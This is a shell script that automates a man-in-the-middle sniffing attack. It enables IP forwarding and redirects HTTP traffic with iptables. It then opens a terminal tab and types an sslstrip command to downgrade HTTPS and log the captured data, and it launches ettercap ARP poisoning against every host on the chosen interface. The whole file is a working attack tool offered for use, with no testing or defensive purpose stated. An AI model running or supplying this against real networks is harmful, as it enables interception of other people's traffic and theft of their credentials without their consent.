#!/bin/sh

	# Author : Ogheneovie Ralph Otutu {Phexcom  InfoSec Evangelist}
	# Copyright (c) phexcom.me
	# Using Ettercap to Sniff Data's From a Network
	# I wrote this piece of code  to  help me quickly fire up ettercap because i hate typing commands over and over again.
	#Kudo to the ettercap team for their great Job

	echo "Happy Sniffing, Hope you not been kicked in the ass"
	echo "To quit Press q"
	
	#Getting Network Interface
	echo "Enter your network interface"
	read	NETWORKINTERFACE
	echo "$NETWORKINTERFACE"
	#enabling Ip forward
	echo "1" > /proc/sys/net/ipv4/ip_forward
	value=$( cat /proc/sys/net/ipv4/ip_forward )
	#checking if IP Forwarding is enabled
	if [ $value -eq 1 ]
	then
		#configuring IP table
  		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000

		#Opening a New Tab on terminal to run SSLstrip Just click enter when the new tab opens

		WID=$(xprop -root | grep "_NET_ACTIVE_WINDOW(WINDOW)"| awk '{print $5}')
		xdotool windowfocus $WID
		xdotool key ctrl+shift+t
		xdotool type --delay 1 --clearmodifiers "sslstrip -k -f -l 10000 -w sslstrip.txt"


		#Running Ettercap 
		
		ettercap -T -q -M ARP /// /// -i $NETWORKINTERFACE   #You can check out the Ettercap Manual By Typing man ettercap  to add more options to the line of code as required.
	else
          		echo "Check if you have ettercap installed"
	fi
